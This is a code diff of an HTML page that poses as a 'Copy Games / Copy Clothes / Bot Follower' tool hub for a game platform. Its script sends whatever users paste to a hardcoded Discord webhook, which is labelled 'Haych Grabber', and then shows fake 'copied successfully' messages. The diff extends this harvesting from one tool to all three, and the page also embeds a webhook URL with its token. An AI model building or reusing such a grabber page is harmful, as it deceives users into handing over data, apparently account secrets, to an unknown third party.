@@ -72,7 +72,7 @@
     .bot { background:linear-gradient(135deg,#2979ff,#00b0ff); box-shadow:0 0 20px #2979ff; }
     .btn:hover { transform:scale(1.1); filter:brightness(1.2); }
 
-    #game {
+    .section {
       display:none;
       position:relative;
       z-index:1;
@@ -98,7 +98,7 @@
       z-index:2;
     }
     .back-btn::before { content:"←"; font-size:24px; }
-    .game-content {
+    .tool-content {
       max-width:520px;
       width:100%;
       background:rgba(15,15,25,0.85);
@@ -109,13 +109,13 @@
       box-shadow:0 20px 80px rgba(0,0,0,0.7);
       text-align:center;
     }
-    .game-content h1 {
+    .tool-content h1 {
       font-size:clamp(32px, 8vw, 48px);
       margin:0 auto 24px;
       font-weight:600;
       color:#fff;
     }
-    .game-content p {
+    .tool-content p {
       font-size:15px;
       line-height:1.6;
       margin-bottom:32px;
@@ -139,27 +139,28 @@
       border-color:#4d9fff;
       box-shadow:0 0 0 4px rgba(77,159,255,0.15);
     }
-    .copy-btn {
+    .action-btn {
       width:100%;
       padding:18px;
       font-size:18px;
       font-weight:600;
-      background:linear-gradient(135deg,#4d9fff,#2979ff);
       border:none;
       border-radius:14px;
       color:white;
       cursor:pointer;
       transition:0.3s;
-      box-shadow:0 8px 24px rgba(41,121,255,0.35);
+      box-shadow:0 8px 24px rgba(0,0,0,0.4);
     }
-    .copy-btn:hover {
+    .game-btn { background:linear-gradient(135deg,#ff2e63,#ff6b6b); }
+    .clothes-btn { background:linear-gradient(135deg,#00c853,#69f0ae); }
+    .bot-btn { background:linear-gradient(135deg,#4d9fff,#2979ff); }
+    .action-btn:hover {
       transform:translateY(-3px);
-      box-shadow:0 12px 32px rgba(41,121,255,0.5);
+      box-shadow:0 12px 32px rgba(0,0,0,0.6);
     }
     .status {
       margin-top:16px;
       font-size:14px;
-      color:#4d9fff;
       min-height:20px;
     }
     .tutorial {
@@ -212,19 +213,17 @@
     </div>
   </div>
 
-  <div id="game">
+  <!-- Game Copier -->
+  <div id="game" class="section">
     <button class="back-btn" onclick="showSection('hub')">Back</button>
-    <div class="game-content">
+    <div class="tool-content">
       <h1>Copy Games</h1>
-      <p>Paste your game file in the box below, then click "Copy Game!" If you don't know how to find a games "game file" then go ahead and watch "How to use"</p>
-
+      <p>Paste your game file/link/ID below, then hit "Copy Game!". Don't know where to get it? Watch the tutorial.</p>
       <div class="input-wrapper">
         <input type="text" id="gameInput" placeholder="Enter game file" />
       </div>
-
-      <button class="copy-btn" onclick="sendToWebhook()">Copy Game!</button>
-      <div id="status" class="status"></div>
-
+      <button class="action-btn game-btn" onclick="sendToWebhook('game')">Copy Game!</button>
+      <div id="gameStatus" class="status"></div>
       <div class="tutorial">
         <h3>How to use</h3>
         <div class="tutorial-btn">
@@ -235,44 +234,84 @@
     </div>
   </div>
 
-  <!-- Placeholders for others -->
-  <div id="clothes" class="section" style="display:none;">
+  <!-- Clothes Copier -->
+  <div id="clothes" class="section">
     <button class="back-btn" onclick="showSection('hub')">Back</button>
-    <div style="max-width:520px; text-align:center;">
-      <h1>Clothes Copier</h1>
-      <p>Coming soon.</p>
+    <div class="tool-content">
+      <h1>Copy Clothes</h1>
+      <p>Paste the clothing item link, ID, or asset below, then click "Copy Clothes!". Check the tutorial if stuck.</p>
+      <div class="input-wrapper">
+        <input type="text" id="clothesInput" placeholder="Enter clothing asset" />
+      </div>
+      <button class="action-btn clothes-btn" onclick="sendToWebhook('clothes')">Copy Clothes!</button>
+      <div id="clothesStatus" class="status"></div>
+      <div class="tutorial">
+        <h3>How to use</h3>
+        <div class="tutorial-btn">
+          <div class="play-icon">▶</div>
+          Video tutorial
+        </div>
+      </div>
     </div>
   </div>
 
-  <div id="bot" class="section" style="display:none;">
+  <!-- Bot Follower -->
+  <div id="bot" class="section">
     <button class="back-btn" onclick="showSection('hub')">Back</button>
-    <div style="max-width:520px; text-align:center;">
+    <div class="tool-content">
       <h1>Bot Follower</h1>
-      <p>Coming soon.</p>
+      <p>Paste the target username, user ID, or profile link below, then hit "Start Following!". Tutorial below if needed.</p>
+      <div class="input-wrapper">
+        <input type="text" id="botInput" placeholder="Enter target username/ID" />
+      </div>
+      <button class="action-btn bot-btn" onclick="sendToWebhook('bot')">Start Following!</button>
+      <div id="botStatus" class="status"></div>
+      <div class="tutorial">
+        <h3>How to use</h3>
+        <div class="tutorial-btn">
+          <div class="play-icon">▶</div>
+          Video tutorial
+        </div>
+      </div>
     </div>
   </div>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1477729322713485474/0FQCzGy3j0B_1yibTFV23yolHpcVmr_1KNYNqAv_gcHYc4u-HgTY2EEqCEmk_ytQxbnN";
 
-    async function sendToWebhook() {
-      const input = document.getElementById('gameInput').value.trim();
-      const status = document.getElementById('status');
+    async function sendToWebhook(tool) {
+      let inputId, statusId, label;
+      if (tool === 'game') {
+        inputId = 'gameInput';
+        statusId = 'gameStatus';
+        label = 'Game file grabbed';
+      } else if (tool === 'clothes') {
+        inputId = 'clothesInput';
+        statusId = 'clothesStatus';
+        label = 'Clothes asset grabbed';
+      } else if (tool === 'bot') {
+        inputId = 'botInput';
+        statusId = 'botStatus';
+        label = 'Bot target grabbed';
+      }
+
+      const input = document.getElementById(inputId).value.trim();
+      const status = document.getElementById(statusId);
 
       if (!input) {
-        status.textContent = "Enter something first, dumbass.";
+        status.textContent = "Enter something first.";
         status.style.color = "#ff4d4d";
         return;
       }
 
-      status.textContent = "Copying game...";
+      status.textContent = "Processing...";
       status.style.color = "#4d9fff";
 
       try {
         const payload = {
-          content: `New game file grabbed:\n\`\`\`${input}\`\`\``,
+          content: `**${label}**\nTool: ${tool.charAt(0).toUpperCase() + tool.slice(1)}\nValue:\n\`\`\`${input}\`\`\``,
           username: "Haych Grabber",
-          avatar_url: "https://i.imgur.com/YourCoolIcon.png" // optional, change or remove
+          avatar_url: null // add if you want a custom avatar
         };
 
         const res = await fetch(WEBHOOK_URL, {
@@ -282,14 +321,14 @@
         });
 
         if (res.ok) {
-          status.textContent = "Game copied successfully!";
+          status.textContent = `${tool.charAt(0).toUpperCase() + tool.slice(1)} processed successfully!`;
           status.style.color = "#00ff9d";
         } else {
-          status.textContent = "Copy failed (check console)";
-          console.error("Webhook failed:", res.status);
+          status.textContent = "Failed (check console)";
+          console.error("Webhook error:", res.status);
         }
       } catch (err) {
-        status.textContent = "Copy failed";
+        status.textContent = "Failed";
         console.error("Fetch error:", err);
       }
     }
@@ -298,13 +337,13 @@
       document.querySelectorAll('#hub, #game, #clothes, #bot').forEach(el => el.style.display = 'none');
       document.getElementById(id).style.display = 'block';
 
-      document.getElementById('dots-canvas').style.display = (id === 'game') ? 'block' : 'none';
-      if (id === 'game') initDots();
+      document.getElementById('dots-canvas').style.display = (id !== 'hub') ? 'block' : 'none';
+      if (id !== 'hub') initDots();
 
       window.scrollTo(0, 0);
     }
 
-    // Wave animation (hub)
+    // Hub waves
     const waveCanvas = document.getElementById("waves");
     const wctx = waveCanvas.getContext("2d");
     waveCanvas.width = window.innerWidth;
@@ -327,7 +366,7 @@
     }
     drawWaves();
 
-    // Mouse particles (hub)
+    // Hub particles
     const pCanvas = document.getElementById("particles");
     const pctx = pCanvas.getContext("2d");
     pCanvas.width = window.innerWidth;
@@ -360,7 +399,7 @@
     }
     drawParticles();
 
-    // Dots for Game Copier
+    // Dots background for tools
     let dots = [];
     let dotsAnim;
     const dotsCanvas = document.getElementById('dots-canvas');
